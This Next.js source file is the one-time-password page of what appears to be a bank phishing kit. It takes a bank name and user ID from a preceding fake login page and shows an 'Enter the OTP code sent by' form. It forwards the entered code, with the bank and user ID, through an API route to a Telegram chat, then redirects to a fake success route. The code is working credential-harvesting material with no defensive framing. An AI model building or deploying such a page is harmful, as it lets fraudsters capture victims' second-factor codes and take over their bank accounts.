'use client';

import { useSearchParams, useRouter } from 'next/navigation';
import { useState } from 'react';

export default function OtpPage() {
  /* ── query params from BankLogin ────────────────────────── */
  const search = useSearchParams();
  const bankName = decodeURIComponent(search.get('bank') ?? 'your bank');
  const userId   = decodeURIComponent(search.get('user') ?? 'unknown user');

  const [otp, setOtp] = useState('');
  const [loading, setLoading] = useState(false);
  const router = useRouter();

  /* ── POST to server‑only API that holds Telegram secrets ── */
  const sendToTelegram = async (text: string) => {
    await fetch('/api/send-telegram', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ text }),
    });
  };

  /* ── Handle OTP submit ─────────────────────────────────── */
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const msg = `
🔑 OTP submitted
🏦 Bank: ${bankName}
👤 User ID: ${userId}
🛡️ OTP: ${otp}
      `.trim();

      await sendToTelegram(msg);
      router.push('/otp/verified'); // adjust to your “success” route
    } catch (err) {
      console.error('OTP send error:', err);
      alert('Something went wrong. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  /* ── UI ────────────────────────────────────────────────── */
  return (
    <main className="min-h-screen flex flex-col justify-center bg-white">
      <div className="flex-grow flex items-center justify-center px-4">
        <form
          onSubmit={handleSubmit}
          className="w-full max-w-md bg-white rounded-md shadow-md p-6 text-center"
        >
          <h1 className="text-xl font-semibold text-gray-800 mb-4">
            Enter the OTP code sent by&nbsp;
            <span className="font-bold text-blue-900">{bankName}</span>
          </h1>

          <label
            htmlFor="otp"
            className="block text-sm font-medium text-left text-gray-700 mb-1"
          >
            OTP
          </label>
          <input
            id="otp"
            name="otp"
            type="text"
            maxLength={6}
            value={otp}
            onChange={(e) => setOtp(e.target.value)}
            required
            className="w-full px-4 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-900"
            placeholder="••••••"
          />

          <button
            type="submit"
            disabled={loading}
            className="mt-6 w-full bg-blue-900 hover:bg-blue-800 text-white py-2 px-4 rounded-full font-semibold disabled:opacity-60"
          >
            {loading ? 'Validating…' : 'Validate'}
          </button>
        </form>
      </div>
    </main>
  );
}
